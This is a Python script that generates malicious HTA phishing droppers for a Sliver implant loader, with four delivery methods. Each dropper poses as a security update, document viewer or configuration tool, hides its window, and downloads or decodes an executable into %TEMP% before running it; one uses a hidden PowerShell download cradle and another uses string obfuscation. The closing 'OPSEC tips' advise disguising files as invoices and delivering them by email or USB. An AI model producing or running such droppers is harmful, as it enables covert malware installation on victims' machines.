#!/usr/bin/env python3
"""
HTA Generator for Sliver Loader
Creates 4 different HTA delivery methods with dynamic configuration
"""

import sys
import os
import base64
import argparse
from datetime import datetime

def banner():
    print("""
╔═══════════════════════════════════════════════════════════╗
║           Sliver Loader - HTA Generator v2.0             ║
║           Dynamic Multi-Method Delivery                   ║
╚═══════════════════════════════════════════════════════════╝
    """)

def build_url(host, filename):
    """Build full URL from host and filename"""
    # Add http:// if not present
    if not host.startswith(('http://', 'https://')):
        host = 'http://' + host
    
    # Remove trailing slash
    host = host.rstrip('/')
    
    # Combine
    return f"{host}/{filename}"

def create_option1_download_execute(loader_url, output_file, exe_name="SecurityUpdate.exe"):
    """Option 1: Direct Download & Execute"""
    
    hta_content = f'''<html>
<head>
<title>Security Update</title>
<HTA:APPLICATION 
    ID="SecurityUpdate"
    APPLICATIONNAME="Security Update"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"/>
<script language="VBScript">
Sub Window_OnLoad
    Dim objShell, objFSO, tempFolder, loaderPath, url
    
    ' Create objects
    Set objShell = CreateObject("WScript.Shell")
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    
    ' Get temp folder
    tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
    loaderPath = tempFolder & "\\{exe_name}"
    
    ' Download URL
    url = "{loader_url}"
    
    ' Download file
    On Error Resume Next
    DownloadFile url, loaderPath
    
    If objFSO.FileExists(loaderPath) Then
        ' Execute
        objShell.Run loaderPath, 0, False
        WScript.Sleep 1000
    End If
    
    ' Close HTA
    window.close()
End Sub

Function DownloadFile(url, destination)
    Dim objXMLHTTP, objADOStream
    
    ' Download
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    objXMLHTTP.Open "GET", url, False
    objXMLHTTP.Send
    
    ' Save
    Set objADOStream = CreateObject("ADODB.Stream")
    objADOStream.Type = 1
    objADOStream.Open
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.SaveToFile destination, 2
    objADOStream.Close
    
    Set objADOStream = Nothing
    Set objXMLHTTP = Nothing
End Function
</script>
</head>
<body>
<p>Loading security update...</p>
</body>
</html>'''
    
    with open(output_file, 'w') as f:
        f.write(hta_content)
    
    print(f"[+] Created: {output_file}")
    print(f"[*] Method: Direct Download & Execute")
    print(f"[*] URL: {loader_url}")
    print(f"[*] Drops as: %TEMP%\\{exe_name}")

def create_option2_embedded_base64(loader_path, output_file, exe_name="viewer.exe"):
    """Option 2: Embedded Base64"""
    
    if not os.path.exists(loader_path):
        print(f"[-] Error: {loader_path} not found!")
        return False
    
    # Read and encode loader
    with open(loader_path, 'rb') as f:
        loader_bytes = f.read()
    
    encoded = base64.b64encode(loader_bytes).decode('utf-8')
    
    # Split into chunks for VBScript (avoid line length limits)
    chunk_size = 100
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    
    hta_content = f'''<html>
<head>
<title>Document Viewer</title>
<HTA:APPLICATION 
    ID="DocumentViewer"
    APPLICATIONNAME="Document Viewer"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"/>
<script language="VBScript">
Sub Window_OnLoad
    Dim objShell, objFSO, tempFolder, loaderPath
    Dim base64Data, decodedData
    
    ' Create objects
    Set objShell = CreateObject("WScript.Shell")
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    
    ' Get temp folder
    tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
    loaderPath = tempFolder & "\\{exe_name}"
    
    ' Base64 encoded payload (split for readability)
    base64Data = ""
'''
    
    for chunk in chunks:
        hta_content += f'    base64Data = base64Data & "{chunk}"\n'
    
    hta_content += '''
    ' Decode and save
    On Error Resume Next
    decodedData = DecodeBase64(base64Data)
    SaveBinaryData loaderPath, decodedData
    
    If objFSO.FileExists(loaderPath) Then
        ' Execute
        objShell.Run loaderPath, 0, False
        WScript.Sleep 1000
    End If
    
    ' Close HTA
    window.close()
End Sub

Function DecodeBase64(base64)
    Dim objXML, objNode
    Set objXML = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML.createElement("b64")
    objNode.DataType = "bin.base64"
    objNode.Text = base64
    DecodeBase64 = objNode.NodeTypedValue
    Set objNode = Nothing
    Set objXML = Nothing
End Function

Sub SaveBinaryData(filename, data)
    Dim objStream
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write data
    objStream.SaveToFile filename, 2
    objStream.Close
    Set objStream = Nothing
End Sub
</script>
</head>
<body>
<p>Opening document...</p>
</body>
</html>'''
    
    with open(output_file, 'w') as f:
        f.write(hta_content)
    
    file_size = len(loader_bytes) / 1024
    print(f"[+] Created: {output_file}")
    print(f"[*] Method: Embedded Base64")
    print(f"[*] Payload size: {file_size:.2f} KB")
    print(f"[*] Encoded size: {len(encoded)} bytes")
    print(f"[*] Drops as: %TEMP%\\{exe_name}")
    
    return True

def create_option3_powershell_cradle(loader_url, output_file, exe_name="update.exe"):
    """Option 3: PowerShell Download Cradle"""
    
    hta_content = f'''<html>
<head>
<title>Application Update</title>
<HTA:APPLICATION 
    ID="AppUpdate"
    APPLICATIONNAME="Application Update"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"/>
<script language="VBScript">
Sub Window_OnLoad
    Dim objShell, psCommand
    
    Set objShell = CreateObject("WScript.Shell")
    
    ' PowerShell download and execute cradle
    psCommand = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command " & _
                "\"$url='{loader_url}';" & _
                "$path=$env:TEMP+'\\{exe_name}';" & _
                "$wc=New-Object System.Net.WebClient;" & _
                "$wc.DownloadFile($url,$path);" & _
                "Start-Process $path -WindowStyle Hidden\""
    
    ' Execute PowerShell
    objShell.Run psCommand, 0, False
    
    WScript.Sleep 2000
    window.close()
End Sub
</script>
</head>
<body>
<p>Checking for updates...</p>
</body>
</html>'''
    
    with open(output_file, 'w') as f:
        f.write(hta_content)
    
    print(f"[+] Created: {output_file}")
    print(f"[*] Method: PowerShell Download Cradle")
    print(f"[*] URL: {loader_url}")
    print(f"[*] Drops as: %TEMP%\\{exe_name}")
    print(f"[*] Execution: Fileless, hidden window")

def create_option4_vbscript_obfuscated(loader_url, output_file, exe_name="syscfg.exe"):
    """Option 4: VBScript Obfuscated Multi-Stage"""
    
    hta_content = f'''<html>
<head>
<title>System Configuration</title>
<HTA:APPLICATION 
    ID="SysConfig"
    APPLICATIONNAME="System Configuration"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"/>
<script language="VBScript">
' Obfuscated variable names
Dim x1, x2, x3, x4, x5, x6, x7

Sub Window_OnLoad
    x1 = "WScript" & ".Shell"
    x2 = "Scripting.File" & "SystemObject"
    x3 = "MSXML2.Server" & "XMLHTTP.6.0"
    x4 = "ADODB.St" & "ream"
    
    Set x5 = CreateObject(x1)
    Set x6 = CreateObject(x2)
    
    x7 = x5.ExpandEnvironmentStrings("%TEMP%") & "\\{exe_name}"
    
    ExecuteStage1
End Sub

Sub ExecuteStage1
    Dim objHTTP, objStream, url
    
    url = "{loader_url}"
    
    On Error Resume Next
    
    ' Stage 1: Download
    Set objHTTP = CreateObject(x3)
    objHTTP.Open "GET", url, False
    objHTTP.Send
    
    If objHTTP.Status = 200 Then
        ' Stage 2: Save
        Set objStream = CreateObject(x4)
        objStream.Type = 1
        objStream.Open
        objStream.Write objHTTP.ResponseBody
        objStream.SaveToFile x7, 2
        objStream.Close
        
        ' Stage 3: Execute
        If x6.FileExists(x7) Then
            x5.Run x7, 0, False
            WScript.Sleep 1500
        End If
    End If
    
    Set objStream = Nothing
    Set objHTTP = Nothing
    
    window.close()
End Sub
</script>
</head>
<body>
<p>Initializing system configuration...</p>
</body>
</html>'''
    
    with open(output_file, 'w') as f:
        f.write(hta_content)
    
    print(f"[+] Created: {output_file}")
    print(f"[*] Method: VBScript Obfuscated Multi-Stage")
    print(f"[*] URL: {loader_url}")
    print(f"[*] Drops as: %TEMP%\\{exe_name}")
    print(f"[*] Features: Variable obfuscation, multi-stage execution")

def main():
    parser = argparse.ArgumentParser(
        description='HTA Generator for Sliver Loader - Multiple delivery methods',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Interactive mode
  %(prog)s
  
  # Generate specific method with flags
  %(prog)s -m 1 -H 192.168.1.100 -f loader.exe -o phish.hta
  
  # Generate all methods
  %(prog)s -m 5 -H https://evil.com -f update.exe
  
  # Embedded method (no host needed)
  %(prog)s -m 2 -l ./loader.exe -o embedded.hta
  
  # Custom exe name when dropped
  %(prog)s -m 3 -H 10.10.10.5 -f payload.exe -e svchost.exe
        '''
    )
    
    parser.add_argument('-m', '--method', 
                        type=int, 
                        choices=[1,2,3,4,5],
                        help='HTA method: 1=Download, 2=Embedded, 3=PowerShell, 4=Obfuscated, 5=All')
    
    parser.add_argument('-H', '--host',
                        help='Web server host/IP (e.g., 192.168.1.100 or https://evil.com)')
    
    parser.add_argument('-f', '--filename',
                        help='Filename on web server (e.g., loader.exe)')
    
    parser.add_argument('-l', '--loader',
                        help='Path to local loader.exe (for method 2)')
    
    parser.add_argument('-o', '--output',
                        help='Output HTA filename')
    
    parser.add_argument('-e', '--exename',
                        help='Executable name when dropped to disk (default: varies by method)')
    
    parser.add_argument('-q', '--quiet',
                        action='store_true',
                        help='Quiet mode (minimal output)')
    
    args = parser.parse_args()
    
    # Show banner unless quiet
    if not args.quiet:
        banner()
    
    # Interactive mode if no method specified
    if not args.method:
        print("HTA Delivery Methods:")
        print("=" * 60)
        print("1. Direct Download & Execute      - Simple, requires web server")
        print("2. Embedded Base64                - Self-contained, larger file")
        print("3. PowerShell Cradle              - Stealthy, uses PowerShell")
        print("4. VBScript Obfuscated            - Multi-stage, obfuscated")
        print("5. Create ALL methods             - Generate all 4 HTAs")
        print("=" * 60)
        
        choice = input("\n[?] Select option (1-5): ").strip()
        
        try:
            args.method = int(choice)
        except:
            print("[-] Invalid option!")
            return
    
    # Get parameters based on method
    if args.method == 1:
        # Direct Download
        if not args.host:
            args.host = input("[?] Enter host/IP (e.g., 192.168.1.100): ").strip()
        if not args.filename:
            args.filename = input("[?] Enter filename (e.g., loader.exe): ").strip()
        if not args.output:
            args.output = input("[?] Output filename [download_execute.hta]: ").strip() or "download_execute.hta"
        
        url = build_url(args.host, args.filename)
        exe_name = args.exename or "SecurityUpdate.exe"
        create_option1_download_execute(url, args.output, exe_name)
        
    elif args.method == 2:
        # Embedded Base64
        if not args.loader:
            args.loader = input("[?] Path to loader.exe [./loader.exe]: ").strip() or "./loader.exe"
        if not args.output:
            args.output = input("[?] Output filename [embedded_base64.hta]: ").strip() or "embedded_base64.hta"
        
        exe_name = args.exename or "viewer.exe"
        if not create_option2_embedded_base64(args.loader, args.output, exe_name):
            return
        
    elif args.method == 3:
        # PowerShell Cradle
        if not args.host:
            args.host = input("[?] Enter host/IP (e.g., 192.168.1.100): ").strip()
        if not args.filename:
            args.filename = input("[?] Enter filename (e.g., loader.exe): ").strip()
        if not args.output:
            args.output = input("[?] Output filename [powershell_cradle.hta]: ").strip() or "powershell_cradle.hta"
        
        url = build_url(args.host, args.filename)
        exe_name = args.exename or "update.exe"
        create_option3_powershell_cradle(url, args.output, exe_name)
        
    elif args.method == 4:
        # VBScript Obfuscated
        if not args.host:
            args.host = input("[?] Enter host/IP (e.g., 192.168.1.100): ").strip()
        if not args.filename:
            args.filename = input("[?] Enter filename (e.g., loader.exe): ").strip()
        if not args.output:
            args.output = input("[?] Output filename [vbscript_obfuscated.hta]: ").strip() or "vbscript_obfuscated.hta"
        
        url = build_url(args.host, args.filename)
        exe_name = args.exename or "syscfg.exe"
        create_option4_vbscript_obfuscated(url, args.output, exe_name)
        
    elif args.method == 5:
        # Create ALL
        print("\n[*] Creating ALL HTA methods...")
        print("-" * 60)
        
        if not args.host:
            args.host = input("[?] Enter host/IP (for methods 1,3,4): ").strip()
        if not args.filename:
            args.filename = input("[?] Enter filename (for methods 1,3,4): ").strip()
        if not args.loader:
            args.loader = input("[?] Path to loader.exe (for method 2) [./loader.exe]: ").strip() or "./loader.exe"
        
        url = build_url(args.host, args.filename)
        
        print("\n[*] Generating HTAs...")
        print("-" * 60)
        create_option1_download_execute(url, "1_download_execute.hta", args.exename or "SecurityUpdate.exe")
        print()
        if not create_option2_embedded_base64(args.loader, "2_embedded_base64.hta", args.exename or "viewer.exe"):
            print("[-] Skipping method 2 due to error")
        print()
        create_option3_powershell_cradle(url, "3_powershell_cradle.hta", args.exename or "update.exe")
        print()
        create_option4_vbscript_obfuscated(url, "4_vbscript_obfuscated.hta", args.exename or "syscfg.exe")
        
        print("\n" + "=" * 60)
        print("[+] ALL HTAs created successfully!")
        print("[*] Files:")
        print("    - 1_download_execute.hta")
        print("    - 2_embedded_base64.hta")
        print("    - 3_powershell_cradle.hta")
        print("    - 4_vbscript_obfuscated.hta")
        print(f"\n[*] All methods will download from: {url}")
    
    if not args.quiet:
        print("\n" + "=" * 60)
        print("[+] HTA generation complete!")
        print("\n[*] Usage:")
        print("    1. Host the HTA file on a web server or share")
        print("    2. Deliver to target (email, USB, etc.)")
        print("    3. User opens HTA (double-click)")
        print("    4. Loader executes automatically")
        
        if args.method != 2:
            print(f"\n[!] Remember to host {args.filename} at: {args.host}")
        else:
            print("\n[!] Method 2: Payload is embedded, no external hosting needed")
        
        print("\n[*] OPSEC Tips:")
        print("    - Rename HTA to something legitimate (Invoice.hta, Report.hta)")
        print("    - Use HTTPS for download URLs")
        print("    - Test in isolated environment first")
        print("    - Consider social engineering context")
        print("\n⚠️  Use only for authorized security testing!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[-] Cancelled by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
